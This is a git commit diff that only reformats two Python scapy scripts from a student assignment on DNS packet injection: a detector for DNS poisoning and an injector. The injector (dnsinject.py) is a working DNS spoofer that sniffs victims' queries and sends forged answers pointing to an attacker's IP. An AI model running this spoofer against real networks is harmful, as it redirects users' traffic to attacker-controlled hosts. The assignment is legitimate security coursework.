bd2bfe1dcf3728276b7950e41b6eaa04853f82d0
Sandeep Vishnu <svishnu@datrium.com>
2018-06-17 11:33:57 -0700

    Py formating

--- Homework 4 - DNS Packet Injection/dnsdetect.py
+++ Homework 4 - DNS Packet Injection/dnsdetect.py
@@ -3,31 +3,39 @@ import argparse
 from scapy.all import *
 
 packet_dict = {}
-
-
 '''
     Prints information about DNS Poison detection
 '''
-def print_poisoning_info(packet,old_packet):
+
+
+def print_poisoning_info(packet, old_packet):
     print 'DNS Poisoning attempt detected'
-    print 'TXID', old_packet[DNS].id,'Request',old_packet[DNS].qd.qname.rstrip('.')
+    print 'TXID', old_packet[DNS].id, 'Request', old_packet[
+        DNS].qd.qname.rstrip('.')
     print 'Answer1 ', old_packet[DNSRR].rdata
     print 'Answer2 ', packet[DNSRR].rdata, '\n'
+
 
 '''
     Recieves a packet specified interfaces and checks in packet_dict for the verification.   
 '''
+
+
 def detect_dns_poison(packet):
-    if packet.haslayer(IP) and packet.haslayer(UDP) and packet.haslayer(DNS) and packet.haslayer(DNSRR):
+    if packet.haslayer(IP) and packet.haslayer(UDP) and packet.haslayer(
+            DNS) and packet.haslayer(DNSRR):
         if packet[DNS].id in packet_dict:
             old_packet = packet_dict[packet[DNS].id]
             if old_packet[IP].dst == packet[IP].dst and old_packet[IP].sport == packet[IP].sport and old_packet[IP].dport == packet[IP].dport and old_packet[DNS].qd.qname == packet[DNS].qd.qname and old_packet[DNSRR].rdata != packet[DNSRR].rdata and old_packet[IP].payload != packet[IP].payload:
-                print_poisoning_info(packet,old_packet)
+                print_poisoning_info(packet, old_packet)
         packet_dict[packet[DNS].id] = packet
+
 
 '''
     Parses the command line arguments
 '''
+
+
 def parse_cmd_line_args():
     parser = argparse.ArgumentParser(add_help=False)
     parser.add_argument('-i')
@@ -45,11 +53,16 @@ if __name__ == '__main__':
     if interface and tracefile:
         print 'Enter only one argument - Eiter the pcap or the interface is supported, not both'
     elif interface:
-        print 'Checking for DNS Poisoning on interface:',interface
-        sniff(filter=expression, iface=interface, store=0, prn=detect_dns_poison)
+        print 'Checking for DNS Poisoning on interface:', interface
+        sniff(
+            filter=expression, iface=interface, store=0, prn=detect_dns_poison)
     elif tracefile:
-        print 'Checking for DNS Poisoning from the tracefile:',tracefile
-        sniff(filter=expression, offline = tracefile, store=0, prn=detect_dns_poison)
+        print 'Checking for DNS Poisoning from the tracefile:', tracefile
+        sniff(
+            filter=expression,
+            offline=tracefile,
+            store=0,
+            prn=detect_dns_poison)
     else:
         print "Checking for DNS Poisoning on all interfaces"
         sniff(filter=expression, store=0, prn=detect_dns_poison)
--- Homework 4 - DNS Packet Injection/dnsinject.py
+++ Homework 4 - DNS Packet Injection/dnsinject.py
@@ -8,38 +8,45 @@ expression = None
 hostname = None
 interface = None
 poison_table = {}
-
 '''
     Recieves a packet and the poisonous ip. Creates a Spoofed Packet and Sends it to the victim
 '''
-def send_spoofed_packet(pkt,poisoned_ip):
+
+
+def send_spoofed_packet(pkt, poisoned_ip):
     spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                       UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                       DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                       an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=poisoned_ip))
     send(spoofed_pkt)
-    print 'Posioned Response:',poisoned_ip
+    print 'Posioned Response:', poisoned_ip
     print 'Sent packet', spoofed_pkt.summary()
 
 
 '''
     Recieves a packet from the victim and creates the poisonous ip based on the options provided    
 '''
+
+
 def spoof_dns(pkt):
-    if expression is None or len(expression) == 0 or pkt[IP].src in expression > 0:
+    if expression is None or len(
+            expression) == 0 or pkt[IP].src in expression > 0:
         if pkt.haslayer(DNSQR):
             victims_query = pkt[DNSQR].qname
-            print 'Victim\'s Query:',victims_query
+            print 'Victim\'s Query:', victims_query
             if hostname is None:
-                send_spoofed_packet(pkt,attacker_ip)
+                send_spoofed_packet(pkt, attacker_ip)
             else:
                 if victims_query.rstrip('.') in poison_table:
-                    send_spoofed_packet(pkt,poison_table[victims_query.rstrip('.')])
+                    send_spoofed_packet(
+                        pkt, poison_table[victims_query.rstrip('.')])
 
 
 '''
     Parses the command line arguments
 '''
+
+
 def parse_cmd_line_args():
     parser = argparse.ArgumentParser(add_help=False)
     parser.add_argument('-i')
@@ -48,23 +55,24 @@ def parse_cmd_line_args():
     args = parser.parse_args()
     return args.i, args.h, args.expression
 
+
 '''
     Main function
 '''
 if __name__ == '__main__':
     interface, hostname, expression = parse_cmd_line_args()
     if hostname:
-        print 'Poisoning Query Table read from: ',hostname
+        print 'Poisoning Query Table read from: ', hostname
         with open(hostname) as fp:
             for line in fp:
-                val,key = line.strip().split()
+                val, key = line.strip().split()
                 poison_table[key] = val
     else:
         print 'Poisoning Victim\'s Query with Attacker IP'
     if expression:
-        print 'Intended Victim:',expression 
+        print 'Intended Victim:', expression
     if interface:
-        print "Capture on interface",interface
+        print "Capture on interface", interface
         sniff(filter=dns_filter, iface=interface, store=0, prn=spoof_dns)
     else:
         print "Capture on all interfaces"
